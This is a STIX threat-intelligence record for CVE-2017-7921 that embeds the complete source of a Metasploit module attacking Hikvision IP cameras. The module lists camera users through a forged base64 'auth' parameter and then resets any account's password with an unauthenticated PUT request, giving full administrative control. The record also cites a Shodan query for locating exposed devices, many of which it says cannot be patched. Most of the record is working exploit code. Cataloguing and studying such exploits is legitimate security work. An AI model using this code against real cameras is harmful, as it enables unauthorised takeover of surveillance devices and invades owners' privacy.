{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--8515f05e-7ed0-4d2e-835d-f15130a6c1c0",
    "created": "2024-08-14T16:24:12.947973Z",
    "modified": "2024-08-14T16:24:12.947977Z",
    "name": "Hikvision IP Camera Unauthenticated Password Change Via Improper Authentication Logic",
    "description": " Many Hikvision IP cameras contain improper authentication logic which allows unauthenticated impersonation of any configured user account. The vulnerability has been present in Hikvision products since 2014. In addition to Hikvision-branded devices, it affects many white-labeled camera products sold under a variety of brand names.  Hundreds of thousands of vulnerable devices are still exposed to the Internet at the time of publishing (shodan search: '\"App-webs\" \"200 OK\"'). Some of these devices can never be patched due to to the vendor preventing users from upgrading the installed firmware on the affected device.  This module utilizes the bug in the authentication logic to perform an unauthenticated password change of any user account on a vulnerable Hikvision IP Camera. This can then be utilized to gain full administrative access to the affected device.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/http/hikvision_unauth_pwd_reset_cve_2017_7921.rb",
            "external_id": "hikvision_unauth_pwd_reset_cve_2017_7921.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2017-7921"
        },
        {
            "source_name": "reference",
            "url": "https://ipvm.com/reports/hik-exploit"
        },
        {
            "source_name": "reference",
            "url": "https://attackerkb.com/topics/PlLehGSmxT/cve-2017-7921"
        },
        {
            "source_name": "reference",
            "url": "https://seclists.org/fulldisclosure/2017/Sep/23"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n\n  include Msf::Auxiliary::Report\n  include Msf::Exploit::Remote::HttpClient\n  require 'base64'\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Hikvision IP Camera Unauthenticated Password Change Via Improper Authentication Logic',\n        'Description' => %q{\n          Many Hikvision IP cameras contain improper authentication logic which allows unauthenticated impersonation of any configured user account.\n          The vulnerability has been present in Hikvision products since 2014. In addition to Hikvision-branded devices, it\n          affects many white-labeled camera products sold under a variety of brand names.\n\n          Hundreds of thousands of vulnerable devices are still exposed to the Internet at the time\n          of publishing (shodan search: '\"App-webs\" \"200 OK\"'). Some of these devices can never be patched due to to the\n          vendor preventing users from upgrading the installed firmware on the affected device.\n\n          This module utilizes the bug in the authentication logic to perform an unauthenticated password change of any user account on\n          a vulnerable Hikvision IP Camera. This can then be utilized to gain full administrative access to the affected device.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Monte Crypto', # Researcher who discovered and disclosed this vulnerability\n          'h00die-gr3y <h00die.gr3y[at]gmail.com>' # Developer and author of this Metasploit module\n        ],\n        'References' => [\n          [ 'CVE', '2017-7921' ],\n          [ 'PACKETSTORM', '144097' ],\n          [ 'URL', 'https://ipvm.com/reports/hik-exploit' ],\n          [ 'URL', 'https://attackerkb.com/topics/PlLehGSmxT/cve-2017-7921' ],\n          [ 'URL', 'https://seclists.org/fulldisclosure/2017/Sep/23' ]\n        ],\n        'DisclosureDate' => '2017-09-23',\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [IOC_IN_LOGS]\n        }\n      )\n    )\n\n    register_options(\n      [\n        Opt::RPORT(80),\n        OptString.new('USERNAME', [ true, 'Username for password change', 'admin']),\n        OptString.new('PASSWORD', [ true, 'New Password (at least 2 UPPERCASE, 2 lowercase and 2 special characters', 'Pa$$W0rd']),\n        OptInt.new('ID', [ true, 'ID (default 1 for admin)', 1]),\n        OptBool.new('STORE_CRED', [false, 'Store credential into the database.', true])\n      ]\n    )\n  end\n\n  def report_creds\n    if datastore['SSL'] == true\n      service_proto = 'https'\n    else\n      service_proto = 'http'\n    end\n    service_data = {\n      address: datastore['RHOSTS'],\n      port: datastore['RPORT'],\n      service_name: service_proto,\n      protocol: 'tcp',\n      workspace_id: myworkspace_id\n    }\n\n    credential_data = {\n      origin_type: :service,\n      module_fullname: fullname,\n      username: datastore['USERNAME'],\n      private_data: datastore['PASSWORD'],\n      private_type: :password\n    }.merge(service_data)\n\n    login_data = {\n      core: create_credential(credential_data),\n      status: Metasploit::Model::Login::Status::UNTRIED\n    }.merge(service_data)\n\n    cred_res = create_credential_login(login_data)\n    unless cred_res.nil?\n      print_status(\"Credentials for #{datastore['USERNAME']} were added to the database...\")\n    end\n  end\n\n  def check\n    begin\n      password = Rex::Text.rand_text_alphanumeric(6..12)\n      auth = Base64.encode64(\"admin:#{password}\")\n      res = send_request_cgi({\n        'method' => 'GET',\n        'uri' => normalize_uri(target_uri.path, 'Security', 'users'),\n        'vars_get' => {\n          'auth' => auth.strip\n        }\n      })\n    rescue StandardError => e\n      elog(\"#{peer} - Communication error occurred: #{e.message}\", error: e)\n      return Exploit::CheckCode::Unknown(\"#{peer} - Communication error occurred: #{e.message}\")\n    end\n\n    if res.nil?\n      return Exploit::CheckCode::Unknown('No response recieved from the target!')\n    elsif res && res.code == 200\n      xml_res = res.get_xml_document\n      print_status('Following users are available for password reset...')\n      user_array = xml_res.css('User')\n      return Exploit::CheckCode::Safe('No users were found in the returned CSS code!') if user_array.blank?\n\n      user_array.each do |user|\n        print_status(\"USERNAME:#{user&.at_css('userName')&.content} | ID:#{user&.at_css('id')&.content} | ROLE:#{user&.at_css('userLevel')&.content}\")\n      end\n      return Exploit::CheckCode::Vulnerable\n    else\n      return Exploit::CheckCode::Safe\n    end\n  end\n\n  def run\n    return unless check == Exploit::CheckCode::Vulnerable\n\n    begin\n      print_status(\"Starting the password reset for #{datastore['USERNAME']}...\")\n      post_data = %(<User version=\"1.0\" xmlns=\"http://www.hikvision.com/ver10/XMLSchema\">\\r\\n<id>#{datastore['ID'].to_s.encode(xml: :text)}</id>\\r\\n<userName>#{datastore['USERNAME']&.encode(xml: :text)}</userName>\\r\\n<password>#{datastore['PASSWORD']&.encode(xml: :text)}</password>\\r\\n</User>)\n\n      password = Rex::Text.rand_text_alphanumeric(6..12)\n      auth = Base64.encode64(\"admin:#{password}\")\n      res = send_request_cgi({\n        'method' => 'PUT',\n        'uri' => normalize_uri(target_uri.path, 'Security', 'users'),\n        'vars_get' => {\n          'auth' => auth.strip\n        },\n        'ctype' => 'application/xml',\n        'data' => post_data\n      })\n    rescue StandardError => e\n      print_error(\"#{peer} - Communication error occurred: #{e.message}\")\n      elog(\"#{peer} - Communication error occurred: #{e.message}\", error: e)\n      return nil\n    end\n\n    if res.nil?\n      fail_with(Failure::Unknown, 'Target server did not respond to the password reset request')\n    elsif res.code == 200\n      print_good(\"Password reset for #{datastore['USERNAME']} was successfully completed!\")\n      print_status(\"Please log in with your new password: #{datastore['PASSWORD']}\")\n      if datastore['STORE_CRED'] == true\n        report_creds\n      end\n    else\n      print_error('Unknown Error. Password reset was not successful!')\n      print_status(\"Please check the password rules and ensure that the user account/ID:#{datastore['USERNAME']}/#{datastore['ID']} exists!\")\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2017-09-23"
}